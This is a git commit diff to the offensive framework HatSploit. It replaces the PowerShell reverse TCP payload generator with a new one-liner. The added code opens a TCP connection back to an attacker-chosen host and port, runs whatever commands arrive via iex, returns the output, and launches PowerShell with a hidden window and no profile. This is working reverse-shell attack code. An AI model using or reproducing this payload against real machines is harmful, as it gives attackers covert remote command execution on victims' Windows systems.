2c1df27112411d1d3a2848708e6625e6c55fc5cb
Ivan Nikolsky <enty8080@gmail.com>
2021-06-27 13:30:45 +0200

    Update powershell_reverse_tcp.py

--- hatsploit/payloads/windows/generic/powershell_reverse_tcp.py
+++ hatsploit/payloads/windows/generic/powershell_reverse_tcp.py
@@ -46,6 +46,7 @@ class HatSploitPayload(Payload, TCPClient):
         local_host, local_port = self.parse_options(self.options)
 
         self.output_process("Generating payload...")
+        '''
         source = (
             f"$a='{local_host}';"
             f"$b={local_port};"
@@ -98,6 +99,20 @@ class HatSploitPayload(Payload, TCPClient):
             "break;"
             "}"
             "}"
+        )
+        '''
+
+        source = (
+            f"$client = New-Object System.Net.Sockets.TCPClient('{local_host}',{local_port});"
+            "$stream = $client.GetStream();"
+            "[byte[]]$bytes = 0..65535|%{0};"
+            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
+            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
+            "$sendback = (iex $data 2>&1 | Out-String );"
+            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
+            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
+            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
+            "$client.Close()"
         )
 
         payload = f"powershell -w hidden -nop -c {source}"
